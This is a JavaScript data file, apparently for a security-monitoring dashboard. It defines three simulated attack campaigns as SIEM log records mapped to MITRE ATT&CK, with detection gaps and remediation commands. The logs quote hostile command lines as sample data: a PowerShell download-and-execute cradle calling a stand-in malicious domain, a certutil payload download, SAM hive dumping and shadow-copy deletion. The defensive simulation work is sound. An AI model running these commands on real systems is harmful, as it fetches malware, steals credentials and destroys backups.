const CAMPAIGNS = {
  apt29: {
    name: "APT29 (Spearphishing & Lateral Movement)",
    description: "Simulates an advanced threat actor entering through a phishing attachment, running malicious PowerShell payloads, dumping credentials, and laterally moving using Windows Remote Management (WinRM).",
    metrics: {
      total: 6,
      covered: 3,
      gaps: 1,
      blindspots: 2
    },
    logs: [
      {
        "@timestamp": "2026-05-24T14:02:15.120Z",
        "log.level": "info",
        "event.category": "process",
        "event.type": "start",
        "event.action": "process-created",
        "host.name": "DESKTOP-WK-912",
        "user.name": "bwandt",
        "process.name": "outlook.exe",
        "process.pid": 4812,
        "process.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe",
        "process.command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe\" /select outlook:calendar",
        "message": "Process outlook.exe started by user bwandt",
        "mitre_attack": {
          "tactic": { "id": "TA0001", "name": "Initial Access" },
          "technique": { "id": "T1566.001", "name": "Phishing: Spearphishing Attachment" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-APT-01",
          "summary": "Email Telemetry Blind Spot",
          "gap_reason": "Process creation event captured, but email gateway headers and attachment hashes are not integrated into the SIEM logs, causing a blind spot for the original entry vector.",
          "remediation": {
            "title": "Ingest Email Gateway Logs & Enable Attachment Auditing",
            "impact": "Resolves blind spots regarding attachment sender details, attachment file hashes, and sender IP geolocation.",
            "steps": [
              "Configure Microsoft Defender for Office 365 or your Secure Email Gateway (SEG) to stream audit logs to the SIEM via API/Event Hub.",
              "Enable Exchange Online Mailbox auditing (Audit log Search) in Microsoft Purview.",
              "Deploy registry policies to log Outlook attachment save events (Process Event ID 11 - File Created via Sysmon)."
            ],
            "cmd": "Set-Mailbox -Identity \"bwandt\" -AuditEnabled $true\nSet-Mailbox -Identity \"bwandt\" -AuditOwner Update,Move,MoveToDeletedItems,SoftDelete,HardDelete,SendAs,SendOnBehalf"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T14:04:32.410Z",
        "log.level": "warning",
        "event.category": "process",
        "event.type": "start",
        "event.action": "process-created",
        "host.name": "DESKTOP-WK-912",
        "user.name": "bwandt",
        "process.name": "powershell.exe",
        "process.pid": 6024,
        "process.parent.name": "outlook.exe",
        "process.parent.pid": 4812,
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {IEX (New-Object Net.WebClient).DownloadString('http://external-malicious-domain.com/payload.ps1')}\"",
        "message": "Suspicious process spawning: outlook.exe spawned powershell.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0002", "name": "Execution" },
          "technique": { "id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-8832-PWR",
          "rule_name": "Suspicious Child Process Spawning from Microsoft Office App",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T14:05:01.002Z",
        "log.level": "info",
        "event.category": "registry",
        "event.type": "change",
        "event.action": "registry-key-modified",
        "host.name": "DESKTOP-WK-912",
        "user.name": "SYSTEM",
        "registry.path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateAgent",
        "registry.value": "C:\\Users\\bwandt\\AppData\\Local\\Temp\\update_agent.exe",
        "message": "Registry Run key added/modified: WindowsUpdateAgent pointing to C:\\Users\\bwandt\\AppData\\Local\\Temp\\update_agent.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0003", "name": "Persistence" },
          "technique": { "id": "T1547.001", "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "Registry Persistence - Run Keys Modification",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T14:08:11.890Z",
        "log.level": "critical",
        "event.category": "iam",
        "event.type": "access",
        "event.action": "lsass-memory-read",
        "host.name": "DESKTOP-WK-912",
        "user.name": "SYSTEM",
        "process.name": "update_agent.exe",
        "process.pid": 7180,
        "process.target.name": "lsass.exe",
        "process.target.pid": 820,
        "process.granted_access": "0x1F0FFF",
        "message": "Process update_agent.exe requested access to LSASS process memory (Sysmon Event ID 10)",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-8991-LSA",
          "rule_name": "LSASS Memory Access via Non-Standard Executable",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T14:12:30.550Z",
        "log.level": "error",
        "event.category": "network",
        "event.type": "connection",
        "event.action": "network-connection-initiated",
        "host.name": "DESKTOP-WK-912",
        "user.name": "bwandt",
        "process.name": "update_agent.exe",
        "process.pid": 7180,
        "source.ip": "192.168.10.15",
        "source.port": 49830,
        "destination.ip": "192.168.10.2",
        "destination.port": 5985,
        "destination.name": "CORP-DC-01",
        "message": "Network connection to CORP-DC-01 (192.168.10.2) on port 5985 (WinRM) initiated by update_agent.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0008", "name": "Lateral Movement" },
          "technique": { "id": "T1021.006", "name": "Remote Services: Windows Remote Management" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-APT-02",
          "summary": "Target Host Remote Management Logging Disabled",
          "gap_reason": "WinRM target auditing (Event ID 400 or WinRM Operational Logs) is disabled on CORP-DC-01. The network connection was logged on the source workstation, but there is no telemetry indicating what commands were executed on the target host.",
          "remediation": {
            "title": "Enable WinRM Operational Logging & Cmd Auditing",
            "impact": "Restores full visibility on execution when WinRM/PowerShell Remoting is used for lateral movement.",
            "steps": [
              "Enable the Event Channel 'Microsoft-Windows-WinRM/Operational' via Group Policy on all servers.",
              "Configure audit policy: Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration -> System Audit Policies -> Detailed Tracking -> Audit Process Creation (Success & Failure).",
              "Turn on PowerShell Script Block Logging (Event ID 4104)."
            ],
            "cmd": "wevtutil sl Microsoft-Windows-WinRM/Operational /e:true\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T14:15:00.000Z",
        "log.level": "info",
        "event.category": "network",
        "event.type": "connection",
        "event.action": "data-sent",
        "host.name": "DESKTOP-WK-912",
        "process.name": "update_agent.exe",
        "process.pid": 7180,
        "source.ip": "192.168.10.15",
        "destination.ip": "203.0.113.88",
        "destination.port": 443,
        "network.bytes_written": 250000000,
        "message": "Outbound connection to 203.0.113.88 on port 443 uploaded 250MB of data",
        "mitre_attack": {
          "tactic": { "id": "TA0010", "name": "Exfiltration" },
          "technique": { "id": "T1048.002", "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Channel" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-APT-03",
          "summary": "SSL/TLS Egress Traffic Decryption Missing",
          "gap_reason": "No egress firewall proxy logs are integrated, and SSL decryption is disabled. The SIEM is blind to large volume encrypted uploads (HTTPS Exfiltration) coming from standard endpoint workstations.",
          "remediation": {
            "title": "Enable SSL Decryption & Stream Egress Traffic Logs",
            "impact": "Exposes encrypted payloads, destination URLs, and detects exfiltration patterns over HTTPS.",
            "steps": [
              "Deploy SSL inspection certificates to workstations via GPO.",
              "Configure NetFlow/IPFIX forwarding from gateway firewalls to capture upload sizes.",
              "Integrate Web Proxy / NGFW logs (e.g., Zscaler, Palo Alto) to monitor outbound URL reputations."
            ],
            "cmd": "# Configure Cisco ASA NetFlow export (Example CLI snippet)\nflow-export destination inside 192.168.10.5 2055\npolicy-map global_policy\n class class-default\n  flow-export event-type all destination 192.168.10.5"
          }
        }
      }
    ]
  },
  
  ransomware: {
    name: "Ransomware Attack (BlackCat/ALPHV Style)",
    description: "Simulates a server intrusion via an unpatched web vulnerability, followed by credential stealing, shadow copy deletion, and host-wide encryption.",
    metrics: {
      total: 5,
      covered: 2,
      gaps: 2,
      blindspots: 1
    },
    logs: [
      {
        "@timestamp": "2026-05-24T15:20:00.105Z",
        "log.level": "warning",
        "event.category": "web",
        "event.type": "access",
        "event.action": "http-request",
        "host.name": "CORP-WEB-02",
        "source.ip": "45.9.20.100",
        "http.request.method": "POST",
        "http.request.uri": "/upload.aspx",
        "http.response.status_code": 200,
        "message": "HTTP POST request to vulnerable endpoint /upload.aspx from IP 45.9.20.100 returned 200 OK",
        "mitre_attack": {
          "tactic": { "id": "TA0001", "name": "Initial Access" },
          "technique": { "id": "T1190", "name": "Exploit Public-Facing Application" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-RANS-01",
          "summary": "Web Application Firewall (WAF) Logs Mismatched",
          "gap_reason": "IIS Web Server logs are received, but the fronting WAF logs containing HTTP request payload data are not ingested, creating a gap in understanding what exploit payload was delivered.",
          "remediation": {
            "title": "Ingest WAF Payloads & Enable Request Inspections",
            "impact": "Exposes exploit patterns, SQL Injection, and Remote Code Execution attempts in HTTP bodies.",
            "steps": [
              "Configure Cloudflare / AWS WAF / F5 BIG-IP log forwarder.",
              "Turn on HTTP POST request body inspection rules.",
              "Map WAF alert events directly to the SIEM alerting index."
            ],
            "cmd": "# Azure Application Gateway WAF Ingestion (Diagnostic Settings CLI)\naz monitor diagnostic-settings create --name \"WAFLogsToSIEM\" --resource \"/subscriptions/.../resourceGroups/.../providers/Microsoft.Network/applicationGateways/CORP-WAF\" --workspace \"/subscriptions/.../workspaces/SIEM-Workspace\" --logs \"[{\\'category\\':\\'ApplicationGatewayFirewallLog\\',\\'enabled\\':true}]\""
          }
        }
      },
      {
        "@timestamp": "2026-05-24T15:22:15.000Z",
        "log.level": "info",
        "event.category": "process",
        "event.type": "start",
        "event.action": "process-created",
        "host.name": "CORP-WEB-02",
        "user.name": "IIS_IUSRS",
        "process.name": "certutil.exe",
        "process.pid": 5510,
        "process.command_line": "certutil.exe -urlcache -f http://45.9.20.100/ransom.exe C:\\Windows\\Temp\\update.exe",
        "message": "certutil.exe downloaded payload from remote server (Ingress Tool Transfer)",
        "mitre_attack": {
          "tactic": { "id": "TA0011", "name": "Command and Control" },
          "technique": { "id": "T1105", "name": "Ingress Tool Transfer" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-RANS-02",
          "summary": "Living-off-the-Land Binary (LOLBIN) Execution Blind Spot",
          "gap_reason": "Endpoint Detection and Response (EDR) policy ignores system utilities like certutil.exe when spawned by service accounts, bypassing basic anomaly triggers.",
          "remediation": {
            "title": "Implement LOLBAS Auditing and Alerting Rules",
            "impact": "Stops attackers from using trusted native Windows tools to download malware.",
            "steps": [
              "Enable EDR rules specifically monitoring LOLBAS binaries (certutil, bitsadmin, mshta) initiating external HTTP connections.",
              "Create a correlation rule in SIEM matching certutil execution with command line parameters containing '-urlcache' or '-ping'."
            ],
            "cmd": "# Sigma Rule Snippet for Certutil Download\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains:\n            - '-urlcache'\n            - '-split'\n            - '-ping'\n    condition: selection"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T15:25:30.900Z",
        "log.level": "warning",
        "event.category": "process",
        "event.type": "start",
        "event.action": "process-created",
        "host.name": "CORP-WEB-02",
        "user.name": "SYSTEM",
        "process.name": "cmd.exe",
        "process.pid": 8904,
        "process.command_line": "cmd.exe /c reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv",
        "message": "SAM database Registry backup attempt detected via reg.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1003.002", "name": "OS Credential Dumping: Security Account Manager" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-9221-SAM",
          "rule_name": "SAM Database Hive Backup Registry Dump Attempt",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T15:28:10.021Z",
        "log.level": "critical",
        "event.category": "process",
        "event.type": "start",
        "event.action": "process-created",
        "host.name": "CORP-WEB-02",
        "user.name": "SYSTEM",
        "process.name": "vssadmin.exe",
        "process.pid": 9102,
        "process.command_line": "vssadmin.exe delete shadows /all /quiet",
        "message": "Volume Shadow Copy deletion initiated (vssadmin.exe)",
        "mitre_attack": {
          "tactic": { "id": "TA0040", "name": "Impact" },
          "technique": { "id": "T1486", "name": "Data Encrypted for Impact" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-9502-VSS",
          "rule_name": "Volume Shadow Copy Deletion via Vssadmin",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T15:28:15.110Z",
        "log.level": "info",
        "event.category": "file",
        "event.type": "change",
        "event.action": "file-renamed",
        "host.name": "CORP-WEB-02",
        "file.path": "D:\\Data\\Finance\\Q2_Report.xlsx",
        "file.extension": "lockbit",
        "message": "Bulk file modification detected: 489 files renamed to '.lockbit' extension within 5 seconds",
        "mitre_attack": {
          "tactic": { "id": "TA0040", "name": "Impact" },
          "technique": { "id": "T1486", "name": "Data Encrypted for Impact" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-RANS-03",
          "summary": "Real-time File Integrity Monitoring Latency",
          "gap_reason": "File integrity monitoring (FIM) tools recorded the file extensions changing, but they lack active behavioral isolation (e.g. rate-limiting process I/O) to intercept ransomware execution before files are locked.",
          "remediation": {
            "title": "Deploy EDR Anti-Ransomware Behavioral Rules",
            "impact": "Actively terminates processes exhibiting high-frequency file rename/write patterns on critical data shares.",
            "steps": [
              "Enable Ransomware Protection modules on endpoint EDR agents.",
              "Configure file-change threshold honeypots (canary files) in file servers to trigger instant isolation upon edit."
            ],
            "cmd": "# Enable Controlled Folder Access (PowerShell Command)\nSet-MpPreference -EnableControlledFolderAccess Enabled"
          }
        }
      }
    ]
  },

  cloud: {
    name: "Cloud Exfiltration & Tenant Takeover",
    description: "Simulates an attacker compromising an Entra ID (Azure AD) administrator account, bypassing MFA, adding a backdoor App registration, and querying Exchange mailboxes via Graph API.",
    metrics: {
      total: 5,
      covered: 2,
      gaps: 2,
      blindspots: 1
    },
    logs: [
      {
        "@timestamp": "2026-05-24T16:01:00.000Z",
        "log.level": "warning",
        "event.category": "iam",
        "event.type": "login",
        "event.action": "user-login-failed",
        "host.name": "EntraID-Tenant-01",
        "user.name": "admin@company.onmicrosoft.com",
        "source.ip": "185.220.101.44",
        "geo.country_name": "Russia",
        "message": "Failed login attempt for admin@company.onmicrosoft.com from Tor Exit Node IP 185.220.101.44",
        "mitre_attack": {
          "tactic": { "id": "TA0001", "name": "Initial Access" },
          "technique": { "id": "T1078.004", "name": "Valid Accounts: Cloud Accounts" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-5510-ENTRA",
          "rule_name": "Failed Login from Known Tor Exit Node",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T16:02:11.450Z",
        "log.level": "info",
        "event.category": "iam",
        "event.type": "login",
        "event.action": "user-login-successful",
        "host.name": "EntraID-Tenant-01",
        "user.name": "admin@company.onmicrosoft.com",
        "source.ip": "185.220.101.44",
        "message": "Successful login for admin@company.onmicrosoft.com following MFA Push Notification approval",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1111", "name": "Adversary-in-the-Middle: Multi-Factor Authentication Bypass" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-CLD-01",
          "summary": "MFA Response Context Missing",
          "gap_reason": "Microsoft Entra Sign-In logs track success/failure, but Microsoft Authenticator push notification context (device information, prompt timings) is not ingested into the security index, leaving a blind spot for MFA push fatigue details.",
          "remediation": {
            "title": "Enable Entra ID MFA Context Ingestion",
            "impact": "Exposes whether an admin was bombarded with requests (fatigue) or approved an out-of-context push notification.",
            "steps": [
              "Enable diagnostic logs streaming for 'AADNonInteractiveUserSignInLogs' and 'EnrichedOffice365AuditLogs'.",
              "Enforce 'Number Matching' in Microsoft Authenticator configuration to stop push fatigue completely."
            ],
            "cmd": "# Turn on Microsoft Entra ID MFA Number Matching (Microsoft Graph PowerShell)\nUpdate-MgPolicyIdentityConditionalAccessPolicy -ConditionalAccessPolicyId \"MFA-Policy-ID\" ... # Enforce MFA registration settings"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T16:05:40.890Z",
        "log.level": "info",
        "event.category": "iam",
        "event.type": "change",
        "event.action": "application-credential-added",
        "host.name": "EntraID-Tenant-01",
        "user.name": "admin@company.onmicrosoft.com",
        "app.name": "OfficeMailSync-Integration",
        "app.id": "d88e001a-9fbc-499e-a89e-2a2f901198fe",
        "message": "New client secret added to Application Registration: OfficeMailSync-Integration",
        "mitre_attack": {
          "tactic": { "id": "TA0003", "name": "Persistence" },
          "technique": { "id": "T1098.001", "name": "Account Manipulation: Additional Cloud Credentials" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-CLD-02",
          "summary": "Directory Audit Logs Forwarder Disconnected",
          "gap_reason": "Entra ID AuditLogs (Directory Activities) are not forwarded to the primary SIEM, causing absolute blindness to administrative tenant changes, including application permission modifications and credential additions.",
          "remediation": {
            "title": "Connect Microsoft Entra ID Audit Logs to SIEM",
            "impact": "Ensures real-time notifications for Application creation, credential manipulation, and role additions.",
            "steps": [
              "Go to Entra ID -> Diagnostic settings.",
              "Click 'Add diagnostic setting' -> Select 'AuditLogs' and 'DirectoryLogs'.",
              "Configure destination: Event Hub, Log Analytics workspace, or HTTPS Partner Endpoint."
            ],
            "cmd": "# CLI Command to configure Entra Diagnostic Streaming\naz monitor diagnostic-settings create --name \"EntraAuditToSIEM\" --resource \"/providers/Microsoft.Directory/AuditLogs\" --workspace \"SIEM-Log-Analytics\""
          }
        }
      },
      {
        "@timestamp": "2026-05-24T16:08:12.300Z",
        "log.level": "info",
        "event.category": "iam",
        "event.type": "access",
        "event.action": "api-access",
        "host.name": "Graph-API-Gateway",
        "app.id": "d88e001a-9fbc-499e-a89e-2a2f901198fe",
        "api.scope": "Mail.ReadWrite, MailboxSettings.Read",
        "message": "Application OfficeMailSync-Integration requested Mail.ReadWrite scope access to mailboxes via Microsoft Graph API",
        "mitre_attack": {
          "tactic": { "id": "TA0009", "name": "Collection" },
          "technique": { "id": "T1114.002", "name": "Email Collection: Mailbox Search" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "High-Privilege Graph API Scope Requested",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T16:11:05.120Z",
        "log.level": "info",
        "event.category": "email",
        "event.type": "access",
        "event.action": "mailbox-queried",
        "host.name": "Exchange-Online",
        "app.name": "OfficeMailSync-Integration",
        "mailbox.owner": "ceo@company.com",
        "message": "Application read 142 emails from mailbox: ceo@company.com",
        "mitre_attack": {
          "tactic": { "id": "TA0009", "name": "Collection" },
          "technique": { "id": "T1114.002", "name": "Email Collection: Mailbox Search" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-CLD-03",
          "summary": "Exchange Mailbox Access Auditing Disabled",
          "gap_reason": "Exchange Online Mailbox Audit logs (specifically MailItemsAccessed events) are not streamed to the SIEM due to license tier limitations, making it impossible to audit which emails were exfiltrated by a compromised app.",
          "remediation": {
            "title": "Enable Exchange Mailbox Item Access Auditing (MailItemsAccessed)",
            "impact": "Exposes exact email access logs for forensic investigation when applications or accounts are compromised.",
            "steps": [
              "Verify tenant has Microsoft 365 E5 or Audit (Premium) license.",
              "Enable Exchange Online Mailbox audit configuration for all mailboxes.",
              "Ensure 'MailItemsAccessed' action is checked in audit settings."
            ],
            "cmd": "Set-Mailbox -Identity \"ceo@company.com\" -AuditOwner @{Add=\"MailItemsAccessed\"}\n# Verify audit settings\nGet-Mailbox -Identity \"ceo@company.com\" | Select-Object -ExpandProperty AuditOwner"
          }
        }
      }
    ]
  }
};
